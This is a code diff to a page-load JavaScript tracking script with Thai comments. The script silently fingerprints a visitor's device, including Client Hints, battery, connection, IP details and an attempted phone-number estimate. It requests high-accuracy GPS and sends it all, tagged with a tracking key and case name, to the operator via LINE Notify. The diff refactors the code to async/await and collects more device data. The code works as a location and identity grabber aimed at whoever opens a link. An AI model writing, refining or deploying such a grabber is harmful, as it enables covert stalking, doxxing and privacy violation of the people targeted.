@@ -22,8 +22,8 @@ function getUrlParameters() {
   }
 }
 
-// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
-(function() {
+// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ (ปรับเป็น async)
+(async function() { // <--- Added async here
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -38,8 +38,8 @@ function getUrlParameters() {
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
 
-  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
-  const deviceInfo = getDetailedDeviceInfo();
+  // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ (ใช้ await)
+  const deviceInfo = await getDetailedDeviceInfo(); // <--- Added await here
   const screenSize = `${window.screen.width}x${window.screen.height}`;
   const screenColorDepth = window.screen.colorDepth;
   const devicePixelRatio = window.devicePixelRatio || 1;
@@ -49,121 +49,196 @@ function getUrlParameters() {
   const connection = getConnectionInfo();
   const browser = detectBrowser();
 
-  // ตรวจสอบการใช้งานแบตเตอรี่
-  getBatteryInfo().then(batteryData => {
-    // รวบรวมข้อมูลทั้งหมด
-    const allDeviceData = {
-      ...deviceInfo,
-      screenSize,
-      screenColorDepth,
+  // ตรวจสอบการใช้งานแบตเตอรี่ (ย้ายมาทำพร้อม deviceInfo)
+  const batteryData = await getBatteryInfo(); // <--- Use await here too
+
+  // รวบรวมข้อมูลทั้งหมด (ทำหลังจาก await ทั้งหมดเสร็จ)
+  const allDeviceData = {
+    ...deviceInfo, // deviceInfo is now available here
+    screenSize,
+    screenColorDepth,
       devicePixelRatio,
       language,
       platform,
       browser,
       connection,
-      battery: batteryData
-    };
+    battery: batteryData // batteryData is now available here
+  };
 
-    // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
-    let dataToSend = {};
-    
-    // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
-    Promise.all([
-      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
-      estimatePhoneNumber().catch(() => null)
-    ])
-    .then(([ipData, phoneInfo]) => {
-      // เก็บข้อมูลที่จำเป็นทั้งหมด
-      dataToSend = {
-        timestamp: timestamp,
-        ip: ipData,
-        deviceInfo: allDeviceData,
-        phoneInfo: phoneInfo,
-        referrer: referrer,
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        useServerMessage: true,
-        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
-      };
-      
-      // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
-      if (navigator.geolocation) {
-        const locationPromise = new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            position => {
-              resolve({
-                lat: position.coords.latitude,
-                long: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-              });
-            },
-            error => {
-              console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
-              resolve("ไม่มีข้อมูล");
-            },
-            {
-              timeout: 5000,
-              enableHighAccuracy: true
-            }
-          );
-        });
-        
-        // รอข้อมูลพิกัดไม่เกิน 5 วินาที
-        Promise.race([
-          locationPromise,
-          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
-        ])
-        .then(location => {
-          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
-          dataToSend.location = location;
-          
-          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
-          sendToLineNotify(dataToSend);
-        });
-      } else {
-        // ถ้าไม่สามารถใช้ Geolocation API ได้
-        dataToSend.location = "ไม่มีข้อมูล";
-        sendToLineNotify(dataToSend);
-      }
+  // สร้างตัวแปรเพื่อเก็บข้อมูลที่จะส่ง
+  let dataToSend = {};
+
+  // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์ (ใช้ await)
+  const [ipData, phoneInfo] = await Promise.all([ // <--- Use await here
+    getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
+    estimatePhoneNumber().catch(() => null)
+  ]);
+
+  // เก็บข้อมูลที่จำเป็นทั้งหมด (ทำหลังจาก await ทั้งหมดเสร็จ)
+  dataToSend = {
+    timestamp: timestamp,
+    ip: ipData,
+    deviceInfo: allDeviceData,
+    phoneInfo: phoneInfo,
+    referrer: referrer,
+    trackingKey: trackingKey || "ไม่มีค่า",
+    caseName: caseName || "ไม่มีค่า",
+    useServerMessage: true,
+    requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
+  };
+
+  // ขอข้อมูลพิกัด (ทำหลังจากข้อมูลอื่นพร้อม)
+  let location = "ไม่มีข้อมูล"; // ค่าเริ่มต้น
+  if (navigator.geolocation) {
+    const locationPromise = new Promise((resolve) => { // ไม่ต้อง reject แค่ resolve เป็น "ไม่มีข้อมูล"
+      navigator.geolocation.getCurrentPosition(
+        position => {
+          resolve({
+            lat: position.coords.latitude,
+            long: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+          });
+        },
+        error => {
+          console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
+          resolve("ไม่มีข้อมูล"); // Resolve ด้วยค่า default
+        },
+        {
+          timeout: 5000, // 5 วินาที
+          enableHighAccuracy: true
+        }
+      );
     });
-  });
-})();
+
+    // รอข้อมูลพิกัดไม่เกิน 5 วินาที (ใช้ await กับ Promise.race)
+    location = await Promise.race([ // <--- Use await here
+      locationPromise,
+      new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
+    ]);
+  }
+
+  // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
+  dataToSend.location = location;
+
+  // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
+  sendToLineNotify(dataToSend);
+
+})(); // <--- End of async IIFE
 
 // สร้าง ID เฉพาะสำหรับการร้องขอ
 function generateUniqueId() {
   return Date.now().toString(36) + Math.random().toString(36).substr(2);
 }
 
-// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด
-function getDetailedDeviceInfo() {
+// ฟังก์ชันรวบรวมข้อมูลอุปกรณ์แบบละเอียด (ปรับปรุงโดยใช้ Client Hints ถ้ามี)
+async function getDetailedDeviceInfo() {
   const userAgent = navigator.userAgent;
   const vendor = navigator.vendor || "ไม่มีข้อมูล";
+  let deviceType = "คอมพิวเตอร์"; // ค่าเริ่มต้น
+  let deviceModel = "ไม่สามารถระบุได้";
+  let platformInfo = navigator.platform || "ไม่มีข้อมูล"; // ใช้ platform เป็นค่าเริ่มต้น
+  let architecture = "ไม่ทราบ";
+  let uaDataBrands = "ไม่มีข้อมูล";
 
-  // ตรวจสอบประเภทอุปกรณ์
+  // ลองใช้ User-Agent Client Hints API (ถ้ามี)
+  if (navigator.userAgentData) {
+    const uaData = navigator.userAgentData;
+    platformInfo = uaData.platform || platformInfo; // ใช้ข้อมูลจาก Client Hints ถ้ามี
+    const isMobile = uaData.mobile; // boolean
+    deviceType = isMobile ? "มือถือ" : "คอมพิวเตอร์"; // Client Hints แม่นยำกว่าเรื่อง mobile
+
+    // เก็บข้อมูล Brands (Browser Name/Version)
+    if (uaData.brands && uaData.brands.length > 0) {
+      uaDataBrands = uaData.brands.map(b => `${b.brand} ${b.version}`).join(', ');
+    }
+
+    // ลองขอข้อมูล High Entropy (อาจต้องมีการอนุญาตหรือตั้งค่า Server)
+    try {
+      const highEntropyValues = await uaData.getHighEntropyValues([
+        "platform", // e.g., "Windows", "Android", "macOS"
+        "platformVersion", // e.g., "10.0", "12", "11.1"
+        "architecture", // e.g., "x86", "arm"
+        "model", // e.g., "Pixel 6", "SM-G998B" (อาจเป็นค่าว่าง)
+        "uaFullVersion" // Detailed browser version
+      ]);
+      platformInfo = `${highEntropyValues.platform || platformInfo} ${highEntropyValues.platformVersion || ''}`.trim();
+      architecture = highEntropyValues.architecture || architecture;
+      // ใช้ model จาก Client Hints ถ้ามี, แต่ถ้าเป็นค่าว่างหรือไม่น่าเชื่อถือ ให้ลอง fallback
+      deviceModel = highEntropyValues.model && highEntropyValues.model.length > 0 ? highEntropyValues.model : deviceModel;
+      // อาจใช้ uaFullVersion แทนการ parse เองใน detectBrowser ถ้าต้องการ
+    } catch (error) {
+      console.warn("ไม่สามารถดึง High Entropy User-Agent Client Hints:", error);
+      // ไม่สามารถดึงข้อมูลละเอียดได้ ใช้ค่า Low Entropy หรือ Fallback ต่อไป
+    }
+
+    // ถ้า deviceModel ยังระบุไม่ได้ (อาจเป็น "" จาก highEntropy) และเป็น Android/iOS ลองใช้ Fallback จาก UA
+    if ((deviceModel === "ไม่สามารถระบุได้" || deviceModel === "") && (platformInfo.startsWith("Android") || platformInfo.startsWith("iOS") || platformInfo.startsWith("iPadOS"))) {
+      deviceModel = parseDeviceModelFromUA(userAgent);
+    }
+    // ถ้ายังไม่ได้ ให้เป็น "ไม่สามารถระบุได้"
+    if (deviceModel === "") deviceModel = "ไม่สามารถระบุได้";
+
+
+  } else {
+    // Fallback ไปใช้ User Agent Parsing แบบเดิมทั้งหมดถ้าไม่มี Client Hints
+    console.warn("User-Agent Client Hints API ไม่รองรับ, ใช้การ parse User Agent แบบเดิม");
+    const uaParseResult = parseDeviceTypeAndModelFromUA(userAgent);
+    deviceType = uaParseResult.deviceType;
+    deviceModel = uaParseResult.deviceModel;
+    // platformInfo จะใช้ navigator.platform ที่เก็บไว้ตอนต้น
+  }
+
+  // ตรวจสอบ Tablet เพิ่มเติม (Client Hints ไม่มีข้อมูล Tablet โดยตรง, ใช้ UA ช่วย)
+  if (deviceType !== "คอมพิวเตอร์" && /iPad|Android(?!.*Mobile)/i.test(userAgent)) {
+     deviceType = "แท็บเล็ต";
+  }
+
+
+  return {
+    userAgent: userAgent, // ยังคงเก็บ UA เดิมไว้เผื่อตรวจสอบ
+    vendor: vendor,
+    deviceType: deviceType,
+    deviceModel: deviceModel,
+    platform: platformInfo, // เปลี่ยนชื่อ field ให้ชัดเจนขึ้น (รวม OS และ Version ถ้ามี)
+    architecture: architecture, // เพิ่มข้อมูลสถาปัตยกรรม
+    uaDataBrands: uaDataBrands // เพิ่มข้อมูล Brands จาก Client Hints
+  };
+}
+
+// ฟังก์ชันช่วย parse device model จาก User Agent (สำหรับ Fallback)
+function parseDeviceModelFromUA(userAgent) {
+  let deviceModel = "ไม่สามารถระบุได้";
+  const iPhoneMatch = userAgent.match(/iPhone\s+OS\s+[\d_]+/i); // จับแค่ว่ามี iPhone OS
+  const iPadMatch = userAgent.match(/iPad.*OS\s+[\d_]+/i); // จับแค่ว่ามี iPad OS
+  // ปรับปรุง Regex ของ Android ให้จับชื่อรุ่นได้ดีขึ้น (อาจต้องปรับปรุงเพิ่ม)
+  // ลองจับ pattern ที่ซับซ้อนขึ้น เช่น Model/Build หรือ ; Model)
+  const androidMatch = userAgent.match(/Android\s+[\d.]+;\s*(?:[a-z]{2}-[a-z]{2};\s*)?([^;]+?)(?:\s+Build|\))/i);
+  const androidModelMatch = userAgent.match(/;\s*([^;]+?)\s+Build\//i); // อีก pattern หนึ่ง
+
+  if (iPhoneMatch) {
+    // ไม่ต้องระบุ OS ในชื่อรุ่นแล้ว เพราะมี platformInfo แยกต่างหาก
+    deviceModel = "iPhone";
+  } else if (iPadMatch) {
+    deviceModel = "iPad";
+  } else if (androidModelMatch) { // ลอง pattern ที่เฉพาะเจาะจงกว่าก่อน
+     deviceModel = androidModelMatch[1].trim();
+  } else if (androidMatch) {
+    deviceModel = androidMatch[1].trim();
+  }
+  // ลบข้อมูลภาษาออก ถ้าบังเอิญติดมา เช่น "ko-kr; SM-G991N"
+  deviceModel = deviceModel.replace(/^[a-z]{2}-[a-z]{2};\s*/, '');
+  return deviceModel;
+}
+
+// ฟังก์ชันช่วย parse device type และ model จาก User Agent (สำหรับ Fallback หลัก)
+function parseDeviceTypeAndModelFromUA(userAgent) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
   const isTablet = /iPad|Android(?!.*Mobile)/i.test(userAgent);
   const deviceType = isTablet ? "แท็บเล็ต" : (isMobile ? "มือถือ" : "คอมพิวเตอร์");
-
-  // ดึงชื่อรุ่นอุปกรณ์ (ประมาณการจาก User Agent)
-  let deviceModel = "ไม่สามารถระบุได้";
-
-  // ตรวจสอบว่าเป็น iPhone หรือไม่
-  const iPhoneMatch = userAgent.match(/iPhone\s+OS\s+(\d+)_(\d+)/i);
-  const iPadMatch = userAgent.match(/iPad.*OS\s+(\d+)_(\d+)/i);
-  const androidMatch = userAgent.match(/Android\s+([\d.]+);\s*([^;]+)/i);
-
-  if (iPhoneMatch) {
-    deviceModel = "iPhone iOS " + iPhoneMatch[1] + "." + iPhoneMatch[2];
-  } else if (iPadMatch) {
-    deviceModel = "iPad iOS " + iPadMatch[1] + "." + iPadMatch[2];
-  } else if (androidMatch) {
-    deviceModel = androidMatch[2].trim();
-  }
+  const deviceModel = parseDeviceModelFromUA(userAgent);
 
   return {
-    userAgent: userAgent,
-    vendor: vendor,
     deviceType: deviceType,
     deviceModel: deviceModel
   };
@@ -423,7 +498,7 @@ function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trac
   }
 }
 
-// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
+// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด (ปรับปรุงให้ใช้ข้อมูลใหม่)
 function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
   // ข้อความหลัก
   const message = [
@@ -471,19 +546,24 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
     message.push(`📍พิกัด GPS: ไม่สามารถระบุได้ (ผู้ใช้ไม่อนุญาต)`);
   }
 
-  // ข้อมูลอุปกรณ์
-  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel}`);
-  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`);
+  // ข้อมูลอุปกรณ์ (ใช้ platform จาก deviceInfo)
+  message.push(`📱อุปกรณ์: ${deviceData.deviceType} - ${deviceData.deviceModel || 'N/A'}`);
+  message.push(`   - ระบบ: ${deviceData.platform || 'N/A'} (${deviceData.architecture || 'N/A'})`); // แสดง OS/Version และ Arch
+  message.push(`   - ผู้ผลิต: ${deviceData.vendor || 'N/A'}`);
+  message.push(`🌐เบราว์เซอร์: ${deviceData.browser}`); // ยังใช้ detectBrowser เดิม
+  if (deviceData.uaDataBrands && deviceData.uaDataBrands !== "ไม่มีข้อมูล") {
+      message.push(`   - Brands (UA Hints): ${deviceData.uaDataBrands}`); // แสดง Brands ถ้ามี
+  }
 
   // ข้อมูลหน้าจอ
   message.push(`📊ขนาดหน้าจอ: ${deviceData.screenSize} (${deviceData.screenColorDepth}bit, x${deviceData.devicePixelRatio})`);
 
-  // ข้อมูลระบบ
-  message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`);
+  // ข้อมูลระบบ (ภาษา)
+  // message.push(`🖥️ระบบปฏิบัติการ: ${deviceData.platform}`); // ย้ายไปรวมกับอุปกรณ์แล้ว
   message.push(`🔤ภาษา: ${deviceData.language}`);
 
   // ข้อมูลการเชื่อมต่อ (เพิ่มเติม)
-  if (typeof deviceData.connection === 'object') {
+  if (typeof deviceData.connection === 'object' && deviceData.connection.type !== "ไม่สามารถระบุได้") { // เช็คว่ามีข้อมูลจริง
     // แสดงประเภทการเชื่อมต่อ (WiFi หรือ Mobile)
     const networkTypeIcon = deviceData.connection.isWifi ? "📶" : "📱";
     const networkType = deviceData.connection.networkType;
